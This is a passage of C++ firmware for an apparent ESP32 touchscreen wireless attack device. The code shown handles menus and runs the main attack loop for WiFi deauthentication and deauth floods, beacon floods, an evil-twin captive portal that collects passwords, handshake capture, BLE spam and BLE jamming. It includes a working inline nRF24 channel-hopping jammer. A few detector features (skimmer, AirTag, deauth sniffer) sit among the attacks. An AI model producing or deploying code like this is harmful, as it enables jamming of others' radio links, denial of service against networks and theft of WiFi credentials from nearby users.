      }
      break;
      
    default:
      currentState = MAIN_MENU;
      hoveredIndex = -1;
      drawMainMenu();
      break;
  }
}

// Calculate which button was pressed based on Y coordinate
int getTouchedButtonIndex(int touchY, int startY) {
  if (touchY < startY) return -1;
  int relativeY = touchY - startY;
  int buttonIndex = relativeY / (BUTTON_HEIGHT + BUTTON_SPACING);
  
  // Check if touch is actually within button bounds (not in spacing)
  int buttonY = startY + (buttonIndex * (BUTTON_HEIGHT + BUTTON_SPACING));
  if (touchY >= buttonY && touchY <= buttonY + BUTTON_HEIGHT) {
    return buttonIndex;
  }
  return -1;
}

void handleMainMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (5 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // Changed from 4 to 5
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // WiFi Tools
          currentState = WIFI_MENU;
          hoveredIndex = -1;
          drawWiFiMenu();
          break;
        case 1: // Bluetooth
          currentState = BLE_MENU;
          hoveredIndex = -1;
          drawBLEMenu();
          break;
        case 2: // Packet Sniffer
          snifferScrollOffset = 0;
          packetHistoryIndex = 0;
          startSniffer();
          break;
        case 3: // More Tools
          currentState = MORE_TOOLS_MENU;
          hoveredIndex = -1;
          drawMoreToolsMenu();
          break;
        case 4: // Settings (NEW)
          currentState = SETTINGS_MENU;
          hoveredIndex = -1;
          drawSettingsMenu();
          break;
      }
    }
  }
}

void handleSettingsMenuTouch(int x, int y) {
  // Back button
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  int controlsX = 145;
  
  // Calculate which menu item was touched
  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    // Verify touch is within button bounds (not in spacing)
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y < buttonY || y > buttonY + MENU_ITEM_HEIGHT) return;
    
    // Ensure index is valid
    if (buttonIndex < 0 || buttonIndex > 3) return;
    
    switch (buttonIndex) {
      case 0: // Device Info
        currentState = DEVICE_INFO;
        hoveredIndex = -1;
        drawDeviceInfo();
        break;
        
      case 1: Serial.println("SD Card initializing...");
        break;
        
      case 2: // Show ASCII Art
        currentState = ASCII_ART_VIEWER;
        drawASCIIArtViewer();
        break;
        
      case 3: // Reboot
        Serial.println("\n[*] Rebooting device...");
        addToConsole("Rebooting...");
        delay(1000);
        ESP.restart();
        break;
    }
  }
}

void handleWiFiMenuTouch(int x, int y) {
  int startY = HEADER_HEIGHT + 10;
  
  // Back button check first (bottom of screen)
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  // Calculate menu item
  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // Scan Networks
          startContinuousWiFiScan();
          break;
        case 1: // Select Target
          if (networkCount > 0) {
            currentState = SELECT_TARGET;
            hoveredIndex = -1;
            drawSelectTargetMenu();
          } else {
            showMessage("Scan networks first!", COLOR_ORANGE);
            delay(500);
            drawWiFiMenu();
          }
          break;
        case 2: // Beacon Manager
          currentState = BEACON_MANAGER;
          beaconDisplayOffset = 0;
          hoveredIndex = -1;
          drawBeaconManager();
          break;
        case 3: // Deauth Flood
          if (networkCount > 0) {
            startDeauthFlood();
          } else {
            showMessage("Scan networks first!", COLOR_ORANGE);
            delay(500);
            drawWiFiMenu();
          }
          break;
      }
    }
  }
}

void checkHeapHealth() {
  static unsigned long lastCheck = 0;
  
  if (millis() - lastCheck < 5000) return;
  lastCheck = millis();
  
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t minHeap = ESP.getMinFreeHeap();
  
  // Warning level
  if (freeHeap < 40000) {
    Serial.printf("[!] LOW MEMORY: %d bytes free (min: %d)\n", freeHeap, minHeap);
    addToConsole("WARN: Low memory");
  }
  
  // Critical level - emergency cleanup
  if (freeHeap < 25000) {
    Serial.println("[!!!] CRITICAL MEMORY - EMERGENCY CLEANUP");
    addToConsole("CRITICAL: Out of memory!");
    
    // Stop all operations
    if (deauthActive) stopDeauth();
    if (bleJammerActive) stopBLEJammer();
    if (nrfJammerActive) stopNRFJammer();
    if (snifferActive) stopSniffer();
    if (portalActive) stopCaptivePortal();
    if (appleSpamActive) stopAppleSpam();
    if (androidSpamActive) stopAndroidSpam();
    
    // Clear buffers
    for (int i = 0; i < 15; i++) {
      consoleBuffer[i] = "";
    }
    
    delay(500);
    
    Serial.printf("[*] After cleanup: %d bytes free\n", ESP.getFreeHeap());
    
    // Return to main menu
    currentState = MAIN_MENU;
    drawMainMenu();
  }
}

void handleBeaconManagerTouch(int x, int y) {
  if (y > 300) {
    if (beaconFloodActive) {
      beaconFloodActive = false;
      esp_wifi_stop();
      delay(100);
      WiFi.mode(WIFI_STA);
    }
    currentState = WIFI_MENU;
    hoveredIndex = -1;
    drawWiFiMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  int buttonIndex = getTouchedButtonIndex(y, startY);
  
  if (buttonIndex == 0) {
    currentState = BEACON_ADD;
    beaconInputSSID = "";
    drawBeaconAddScreen();
    return;
  } else if (buttonIndex == 1) {
    if (customBeaconCount == 0) {
      addToConsole("WARN: Add beacons first");
      drawBeaconManager();
      return;
    }
    beaconFloodActive = !beaconFloodActive;
    if (beaconFloodActive) {
      addToConsole("Custom beacon flood started");
    } else {
      addToConsole("Beacon flood stopped");
      esp_wifi_stop();
      delay(100);
      WiFi.mode(WIFI_STA);
    }
    drawBeaconManager();
    return;
  }
  
  int listStartY = HEADER_HEIGHT + 10 + (2 * (BUTTON_HEIGHT + BUTTON_SPACING)) + 55;
  int deleteX = SCREEN_WIDTH - SIDE_MARGIN - 35;
  
  if (x >= deleteX && x <= deleteX + 30) {
    int itemIndex = (y - listStartY) / 22;
    if (itemIndex >= 0 && itemIndex < MAX_DISPLAY_BEACONS) {
      int actualIndex = beaconDisplayOffset + itemIndex;
      if (actualIndex < customBeaconCount) {
        deleteBeacon(actualIndex);
        drawBeaconManager();
      }
    }
  }
  
  int scrollY = listStartY + (MAX_DISPLAY_BEACONS * 22) + 3;
  if (y >= scrollY && y <= scrollY + 15 && customBeaconCount > MAX_DISPLAY_BEACONS) {
    beaconDisplayOffset = (beaconDisplayOffset + MAX_DISPLAY_BEACONS) % customBeaconCount;
    drawBeaconManager();
  }
}

void handleBLEMenuTouch(int x, int y) {
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (5 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:  // nRF24 Jammer - Real disconnect
          currentState = NRF_JAM_MENU;
          hoveredIndex = -1;
          drawNRFJammerMenu();
          break;
        case 1:  // Apple/Android Spam
          currentState = SPAM_MENU;
          hoveredIndex = -1;
          drawSpamMenu();
          break;
        case 2:  // Scan BLE
          scanBLEDevices();
          break;
        case 3:  // AirTag Scan
          startAirTagScanner();
          break;
        case 4:  // Skimmer Detect
          startSkimmerDetector();
          break;
      }
    }
  }
}

void handleBLEJamMenuTouch(int x, int y) {
  if (y > 300) {
    if (bleJammerActive) stopBLEJammer();
    currentState = BLE_MENU;
    hoveredIndex = -1;
    drawBLEMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + MENU_ITEM_HEIGHT) {
    if (!bleJammerActive) {
      startBLEJammer();
    } else {
      stopBLEJammer();
      drawBLEJammerMenu();
    }
  }
}

void handleNRFJamMenuTouch(int x, int y) {
  if (y > 300) {
    // Back button pressed
    if (nrfJammerActive) stopNRFJammer();
    currentState = BLE_MENU;
    hoveredIndex = -1;
    drawBLEMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:  // Start/Stop Jammer
          if (!nrfJammerActive) {
            startNRFJammer();
          } else {
            stopNRFJammer();
            drawNRFJammerMenu();
          }
          break;
          
        case 1:  // Toggle Dual Mode
          if (nrf1Available && nrf2Available) {
            dualNRFMode = !dualNRFMode;
            addToConsole(dualNRFMode ? "Dual mode ON" : "Single mode");
            Serial.printf("[*] Dual mode: %s\n", dualNRFMode ? "ON" : "OFF");
          } else {
            addToConsole("ERROR: Need 2 radios");
            Serial.println("[!] Need 2 radios for dual mode");
          }
          drawNRFJammerMenu();
          break;
          
        case 2:  // Cycle Mode (NEW)
          // Cycle through modes: SWEEP -> RANDOM -> FOCUSED -> SWEEP
          nrfJamMode = (NRFJamMode)((nrfJamMode + 1) % 3);
          
          const char* modeName = "";
          switch (nrfJamMode) {
            case NRF_SWEEP:   modeName = "SWEEP (Smoochiee)"; break;
            case NRF_RANDOM:  modeName = "RANDOM"; break;
            case NRF_FOCUSED: modeName = "FOCUSED (BLE)"; break;
          }
          
          addToConsole(String("Mode: ") + modeName);
          Serial.printf("[*] Jamming mode: %s\n", modeName);
          
          // If jammer is active, reset counters for new mode
          if (nrfJammerActive) {
            // Reset sweep pattern
            flag_radio1 = 0;
            flag_radio2 = 0;
            nrf_ch1 = 2;
            nrf_ch2 = 45;
          }
          
          drawNRFJammerMenu();
          break;
      }
    }
  }
}

void handleSpamMenuTouch(int x, int y) {
  if (y > 300) {
    // Clean stop
    if (appleSpamActive) stopAppleSpam();
    if (androidSpamActive) stopAndroidSpam();
    
    currentState = BLE_MENU;
    hoveredIndex = -1;
    drawBLEMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:  // Apple Spam
          if (!appleSpamActive) {
            if (androidSpamActive) stopAndroidSpam();
            startAppleSpam();
          } else {
            stopAppleSpam();
          }
          drawSpamMenu();
          break;
          
        case 1:  // Android Spam
          if (!androidSpamActive) {
            if (appleSpamActive) stopAppleSpam();
            startAndroidSpam();
          } else {
            stopAndroidSpam();
          }
          drawSpamMenu();
          break;
          
        case 2:  // Combined Spam
          if (!appleSpamActive || !androidSpamActive) {
            startCombinedSpam();
          } else {
            stopAppleSpam();
            stopAndroidSpam();
          }
          drawSpamMenu();
          break;
      }
    }
  }
}

void handleMoreToolsTouch(int x, int y) {
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // Changed from 3 to 4
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:  // Deauth Sniffer
          currentState = DEAUTH_SNIFFER;
          hoveredIndex = -1;
          drawDeauthSnifferMenu();
          break;
        case 1:  // Skimmer Detect
          startSkimmerDetector();
          break;
        case 2:  // Wardriving
          startWardriving();
          break;
        case 3:  // Console
          showConsole();
          break;
      }
    }
  }
}

void handleWiFiScanTouch(int x, int y) {
  if (y > 300) {
    continuousWiFiScan = false;
    WiFi.scanDelete();
    currentState = WIFI_MENU;
    hoveredIndex = -1;
    drawWiFiMenu();
    return;
  }
  
  int listY = HEADER_HEIGHT + 35;
  int itemHeight = 22;
  
  if (y >= listY && y <= listY + (MAX_WIFI_DISPLAY * itemHeight)) {
    int clickedIndex = (y - listY) / itemHeight;
    int actualIndex = wifiScrollOffset + clickedIndex;
    
    if (actualIndex >= 0 && actualIndex < networkCount) {
      selectedSSID = networks[actualIndex].ssid;
      selectedIndex = actualIndex;
      continuousWiFiScan = false;
      WiFi.scanDelete();
      currentState = WIFI_ATTACK_MENU;
      drawAttackMenu();
      addToConsole("Target: " + selectedSSID);
    }
  }
  else if (y < listY && wifiScrollOffset > 0) {
    wifiScrollOffset = max(0, wifiScrollOffset - MAX_WIFI_DISPLAY);
    displayContinuousWiFiScan();
  }
  else if (y > 270 && y < 300 && wifiScrollOffset + MAX_WIFI_DISPLAY < networkCount) {
    wifiScrollOffset = min(networkCount - MAX_WIFI_DISPLAY, wifiScrollOffset + MAX_WIFI_DISPLAY);
    displayContinuousWiFiScan();
  }
}

void handleAttackMenuTouch(int x, int y) {
  if (y > 300) {
    if (deauthActive) stopDeauth();
    if (portalActive) stopCaptivePortal();
    if (currentState == HANDSHAKE_CAPTURE) {
      esp_wifi_set_promiscuous(false);
    }
    currentState = WIFI_MENU;
    hoveredIndex = -1;
    drawWiFiMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 25;
  
  if (y >= startY && y < startY + (6 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0:
          if (portalActive) stopCaptivePortal();
          if (currentState == HANDSHAKE_CAPTURE) {
            esp_wifi_set_promiscuous(false);
            currentState = WIFI_ATTACK_MENU;
          }
          currentDeauthMethod = 0;
          startDeauth();
          delay(300);
          drawAttackMenu();
          break;
          
        case 1:
          if (portalActive) stopCaptivePortal();
          if (currentState == HANDSHAKE_CAPTURE) {
            esp_wifi_set_promiscuous(false);
            currentState = WIFI_ATTACK_MENU;
          }
          currentDeauthMethod = 1;
          startDeauth();
          delay(300);
          drawAttackMenu();
          break;
          
        case 2:
          lastAttackTime = millis();
          startHandshakeCapture();
          break;
          
        case 3:
          startEvilTwin();
          drawAttackMenu();
          break;
          
        case 4:
          credDisplayOffset = 0;
          displayCapturedPasswords();
          break;
          
        case 5:
          stopDeauth();
          if (portalActive) stopCaptivePortal();
          if (currentState == HANDSHAKE_CAPTURE) {
            esp_wifi_set_promiscuous(false);
            currentState = WIFI_ATTACK_MENU;
          }
          drawAttackMenu();
          break;
      }
    }
  }
}

void loop() {
  esp_task_wdt_reset();
  
  // ==================== TURBO MODE: nRF24 JAMMER ONLY ====================
  if (nrfJammerActive && nrfTurboMode) {
    // ONLY jamming + minimal touch checking
    
    // Ultra-fast touch check: only every 5000 hops (~50ms at 100K/sec)
    static uint32_t lastTouchCheck = 0;
    if ((nrfJamPackets - lastTouchCheck) > 5000) {
      uint16_t touchX, touchY;
      // Single fast check - no delay, no verification
      if (tft.getTouch(&touchX, &touchY)) {
        // ANY touch stops jammer
        stopNRFJammer();
        currentState = NRF_JAM_MENU;
        hoveredIndex = -1;
        drawNRFJammerMenu();
        return;
      }
      lastTouchCheck = nrfJamPackets;
    }

    if (deauthFloodActive && currentState == WIFI_BLE_NRF_JAM) {
      performDeauthFlood();
      
      static unsigned long lastFloodDisplay = 0;
      if (millis() - lastFloodDisplay > 300) {
        updateDeauthFloodDisplay();
        lastFloodDisplay = millis();
      }
    }
    
    // Route to selected jamming mode (INLINE for speed)
    switch (nrfJamMode) {
      case NRF_SWEEP:
        // ⭐ SMOOCHIEE'S SWEEP PATTERN (INLINE)
        if (flag_radio1 == 0) nrf_ch1 += 4; else nrf_ch1 -= 4;
        if (flag_radio2 == 0) nrf_ch2 += 2; else nrf_ch2 -= 2;
        
        if ((nrf_ch1 > 79) && (flag_radio1 == 0)) flag_radio1 = 1;
        else if ((nrf_ch1 < 2) && (flag_radio1 == 1)) flag_radio1 = 0;
        
        if ((nrf_ch2 > 79) && (flag_radio2 == 0)) flag_radio2 = 1;
        else if ((nrf_ch2 < 2) && (flag_radio2 == 1)) flag_radio2 = 0;
        
        if (nrf1Available) { radio1.setChannel(nrf_ch1); SAFE_INCREMENT(nrf1Packets); }
        if (nrf2Available && dualNRFMode) { radio2.setChannel(nrf_ch2); SAFE_INCREMENT(nrf2Packets); }
        break;
        
      case NRF_RANDOM:
        if (nrf1Available) { radio1.setChannel(random(80)); SAFE_INCREMENT(nrf1Packets); }
        if (nrf2Available && dualNRFMode) { radio2.setChannel(random(80)); SAFE_INCREMENT(nrf2Packets); }
        break;
        
      case NRF_FOCUSED:
        if (nrf1Available) {
          ptr_hop1 = (ptr_hop1 + 1) % 24;
          radio1.setChannel(hopping_channel[ptr_hop1]);
          SAFE_INCREMENT(nrf1Packets);
        }
        if (nrf2Available && dualNRFMode) {
          ptr_hop2 = (ptr_hop2 + 1) % 24;
          radio2.setChannel(hopping_channel[ptr_hop2]);
          SAFE_INCREMENT(nrf2Packets);
        }
        break;
    }
    
    // Update total count (thread-safe)
    uint32_t packets1, packets2;
    SAFE_READ(nrf1Packets, packets1);
    SAFE_READ(nrf2Packets, packets2);
    nrfJamPackets = packets1 + packets2;
    
    // Watchdog every 5000 hops
    if ((nrfJamPackets % 5000) == 0) {
      esp_task_wdt_reset();
    }
    
    // Stats every 100K hops
    if ((nrfJamPackets % 100000) == 0 && millis() - nrfLastStats > 1000) {
      nrfLastStats = millis();
      unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
      if (runtime > 0) {
        unsigned long hopsPerSec = nrfJamPackets / runtime;
        Serial.printf("[nRF24] %lu hops | %lu/sec | R1:%lu R2:%lu\n", 
                      nrfJamPackets, hopsPerSec, packets1, packets2);
        
        if (hopsPerSec > 50000) Serial.println("        ✓ EXCELLENT");
        else if (hopsPerSec > 30000) Serial.println("        ✓ VERY GOOD");
        else if (hopsPerSec > 15000) Serial.println("        ✓ GOOD");
        else Serial.println("        ⚠ Check hardware");
      }
    }
    
    // ⚡ NO DELAYS! Return immediately
    return;
  }
  
  // ==================== NORMAL MODE: Full UI + Features ====================
  checkHeapHealth();
  
  // Real-time attack updates
  if (currentState == WIFI_ATTACK_MENU) {
    static unsigned long lastAttackUpdate = 0;
    if (millis() - lastAttackUpdate > 200) {
      updateAttackMenuLive();
      lastAttackUpdate = millis();
    }
  }
  
  if (currentState == CAPTURED_PASSWORDS) {
    static unsigned long lastPwdUpdate = 0;
    static int lastCredCount = 0;
    if (capturedCredCount != lastCredCount || millis() - lastPwdUpdate > 2000) {
      displayCapturedPasswords();
      lastCredCount = capturedCredCount;
      lastPwdUpdate = millis();
    }
  }
  
  if (currentState == HANDSHAKE_CAPTURE) {
    static unsigned long lastHandshakeUpdate = 0;
    static bool wasCapture = false;
    if (millis() - lastHandshakeUpdate > 300 || 
        (capturedHandshake.captured && !wasCapture)) {
      displayHandshakeCapture();
      wasCapture = capturedHandshake.captured;
      lastHandshakeUpdate = millis();
    }
  }
  
  // Live scanning updates
  if (currentState == DEAUTH_SNIFFER_ACTIVE) {
    static unsigned long lastDeauthUpdate = 0;
    if (millis() - lastDeauthUpdate > 500) {
      displayDeauthSnifferActive();
      lastDeauthUpdate = millis();
    }
  }
  
  if (currentState == AIRTAG_SCANNER || currentState == AIRTAG_RESULTS) {
    static unsigned long lastAirTagUpdate = 0;
    if (millis() - lastAirTagUpdate > 1000) {
      displayAirTagResults();
      lastAirTagUpdate = millis();
    }
  }
  
  if (currentState == SKIMMER_DETECTOR || currentState == SKIMMER_RESULTS) {
    static unsigned long lastSkimmerUpdate = 0;
    if (millis() - lastSkimmerUpdate > 1000) {
      displaySkimmerResults();
      lastSkimmerUpdate = millis();
    }
  }
  
  if (currentState == WARDRIVING_MODE) {
    static unsigned long lastWardrivingUpdate = 0;
    if (millis() - lastWardrivingUpdate > 1000) {
      displayWardrivingResults();
      lastWardrivingUpdate = millis();
    }
  }
  
  if (continuousWiFiScan && currentState == WIFI_SCAN) {
    processWiFiScanResults();
    static unsigned long lastDisplayUpdate = 0;
    if (millis() - lastDisplayUpdate > 500) {
      displayContinuousWiFiScan();
      lastDisplayUpdate = millis();
    }
  }
  
  if (continuousBLEScan && currentState == BLE_SCAN_RESULTS) {
    if (millis() - lastBLEScanUpdate > 2000) {
      if (pBLEScan != nullptr) {
        BLEScanResults results = pBLEScan->getResults();
        bleDeviceCount = results.getCount();
        if (bleDeviceCount > 50) bleDeviceCount = 50;
        
        for (int i = 0; i < bleDeviceCount; i++) {
          BLEAdvertisedDevice device = results.getDevice(i);
          bleDevices[i].address = device.getAddress().toString().c_str();
          bleDevices[i].name = device.haveName() ? device.getName().c_str() : "Unknown";
          bleDevices[i].rssi = device.getRSSI();
        }
        
        displayBLEScanResults();
      }
      lastBLEScanUpdate = millis();
    }
  }
  
  // Fast channel hopping sniffer with proper display
  if (snifferActive && currentState == SNIFFER_ACTIVE) {
    static unsigned long lastChannelHop = 0;
    static unsigned long lastSnifferUpdate = 0;
    
    // Fast channel hopping - 200ms per channel (5 channels/sec like Marauder)
    if (millis() - lastChannelHop > 200) {
      snifferChannel = (snifferChannel % 13) + 1;  // Cycle through channels 1-13
      esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
      lastChannelHop = millis();
    }
    
    // Update display every 300ms (smooth without flicker)
    if (millis() - lastSnifferUpdate > 300) {
      displaySnifferActive();
      lastSnifferUpdate = millis();
    }
    
    // Check for handshake capture
    static bool lastCapturedState = false;
    if (capturedHandshake.captured && !lastCapturedState) {
      Serial.println("[+] FULL HANDSHAKE CAPTURED!");
      addToConsole("Handshake captured!");
      lastCapturedState = true;
    }
    if (!capturedHandshake.captured) {
      lastCapturedState = false;
    }
  }
  
  // Touch handling
  handleTouch();
  handleSerialCommands();
  
  // Animations
  if (showSkull && millis() - lastAnimTime > 50) {
    animateSkull();
    lastAnimTime = millis();
  }
  
  // Active attacks
  if (deauthActive) {
    performDeauth();
    delayMicroseconds(100);
  }
  
  if (beaconFloodActive) {
    performBeaconFlood();
  }
  
  // BLE operations (only if nRF24 is OFF)
  if (bleJammerActive && !nrfJammerActive) {
    performBLEJam();
    
    if (currentState == BLE_JAM_ACTIVE) {
      static unsigned long lastBLEJamDisplay = 0;
      if (millis() - lastBLEJamDisplay > 500) {
        updateBLEJammerDisplay();
        lastBLEJamDisplay = millis();
      }
    }
  }
  
  // BLE Spam (only if nothing else active)
  if (!nrfJammerActive && !bleJammerActive) {
    if (appleSpamActive && androidSpamActive) {
      // Combined spam mode
      performCombinedSpam();
    } else {
      // Individual spam modes
      if (appleSpamActive) performAppleSpam();
      if (androidSpamActive) performAndroidSpam();
    }
  }
  
  // Captive portal (when not jamming)
  if (portalActive && !bleJammerActive && !nrfJammerActive && !snifferActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  delay(1);
}

void updateAttackMenuLive() {
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate < 200) return;
  lastUpdate = millis();
  // Only update if we're actually in the attack menu
  if (currentState != WIFI_ATTACK_MENU) return;
  
  // Calculate positions (must match drawAttackMenu())
  int separatorY = HEADER_HEIGHT + 25 + (6 * (MENU_ITEM_HEIGHT + MENU_SPACING)) + 5;
  int statusY = separatorY + 8;
  int leftColX = SIDE_MARGIN;
  int rightColX = 130;
  
  // ===== UPDATE <Active> INDICATORS ON MENU ITEMS =====
  int menuY = HEADER_HEIGHT + 25;
  for (int i = 0; i < 6; i++) {
    int itemY = menuY + (i * (MENU_ITEM_HEIGHT + MENU_SPACING));
    
    // Clear the indicator area
    tft.fillRect(168, itemY + 5, 72, 14, COLOR_BG);
    
    // Show <Active> if running
    bool showActive = false;
    if (i == 0 && deauthActive && currentDeauthMethod == 0) showActive = true;
    if (i == 1 && deauthActive && currentDeauthMethod == 1) showActive = true;
    if (i == 2 && currentState == HANDSHAKE_CAPTURE) showActive = true;
    if (i == 3 && portalActive) showActive = true;
    
    if (showActive) {
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(170, itemY + 7);
      tft.print("<Active>");
    }
  }
  
  // ===== CLEAR ONLY THE STATUS SECTION (STOP BEFORE BACK BUTTON) =====
  // backY = 305, so clear up to 303 to leave back button untouched
  int clearHeight = 303 - statusY;  // Calculate exact height to back button area
  tft.fillRect(0, statusY - 2, 240, clearHeight, COLOR_BG);
  
  // ===== DRAW LEFT COLUMN STATUS =====
  tft.setTextSize(1);
  
  // Deauth status
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(leftColX, statusY);
  tft.print("Deauth:");
  tft.setCursor(leftColX + 48, statusY);
  tft.setTextColor(deauthActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.print(deauthActive ? "ACTIVE" : "OFF   ");
  
  // Portal status (NO method here)
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(leftColX, statusY + 12);
  tft.print("Portal:");
  tft.setCursor(leftColX + 48, statusY + 12);
  tft.setTextColor(portalActive ? COLOR_ORANGE : COLOR_TEXT);
  tft.print(portalActive ? "ACTIVE" : "OFF   ");
  
  // Handshake status
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(leftColX, statusY + 24);
  tft.print("Handshake:");
  tft.setCursor(leftColX + 60, statusY + 24);
  if (capturedHandshake.captured) {
    static bool justCaptured = false;
    static unsigned long captureTime = 0;
    if (!justCaptured) {
      justCaptured = true;
      captureTime = millis();
    }
    
    bool showText = true;
    if (millis() - captureTime < 3000) {
      showText = (millis() / 250) % 2 == 0;
    } else {
      justCaptured = false;
    }
    
    if (showText) {
      tft.setTextColor(COLOR_GREEN);
      tft.print("YES");
    }
  } else {
    tft.setTextColor(COLOR_TEXT);
    tft.print("NO ");
  }
  
  // Passwords count
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(leftColX, statusY + 36);
  tft.print("Passwords:");
  tft.setCursor(leftColX + 60, statusY + 36);
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%-3d", capturedCredCount);
  
  // Show NEW indicator
  static int lastShownCount = 0;
  static unsigned long lastPwdTime = 0;
  if (capturedCredCount > lastShownCount) {
    lastShownCount = capturedCredCount;
    lastPwdTime = millis();
  }
  if (millis() - lastPwdTime < 2000 && capturedCredCount > 0) {
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(leftColX + 85, statusY + 36);
    tft.print("NEW!");
  }
  
  // ===== RIGHT COLUMN - Active attack details =====
  if (deauthActive) {
    // Packets: label on top, value below (can expand)
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(rightColX, statusY);
    tft.print("Packets:");
    tft.setCursor(rightColX, statusY + 12);  // Value BELOW label
    tft.setTextColor(COLOR_ORANGE);
    tft.printf("%-8d", deauthPacketsSent);
    
    // Method: value on SAME line (ONLY place showing method)
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(rightColX, statusY + 24);
    tft.print("Method:");
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(rightColX + 42, statusY + 24);  // Value to the right
    tft.print(currentDeauthMethod == 0 ? "Standard" : "Storm   ");
  }
  
  if (portalActive) {
    // Clients: value on SAME line
    int portalY = deauthActive ? statusY + 36 : statusY;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(rightColX, portalY);
    tft.print("Clients:");
    
    int clientCount = WiFi.softAPgetStationNum();
    tft.setTextColor(clientCount > 0 ? COLOR_GREEN : COLOR_TEXT);
    tft.setCursor(rightColX + 48, portalY);  // Value to the right
    tft.printf("%-2d", clientCount);
    
    // Activity indicator
    if (clientCount > 0) {
      static bool clientBlink = false;
      clientBlink = !clientBlink;
      tft.setTextColor(clientBlink ? COLOR_ORANGE : COLOR_BG);
      tft.setCursor(rightColX + 65, portalY);
      tft.print("*");
    }
  }
  
  // ===== ATTACK STATUS MESSAGE AREA =====
  int msgY = statusY + 60;
  
  // Timer for deauth start message
  static unsigned long deauthStartTime = 0;
  if (deauthActive && deauthStartTime == 0) {
    deauthStartTime = millis();
  }
  if (!deauthActive) {
    deauthStartTime = 0;
  }
  
  // Show attack initiation messages
  if (deauthActive && (millis() - deauthStartTime < 5000)) {  // Show for 5 seconds
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(leftColX, msgY);
    tft.print("> Deauth attack started...");
  } else if (portalActive && WiFi.softAPgetStationNum() == 0) {
    tft.setTextColor(COLOR_CYAN);
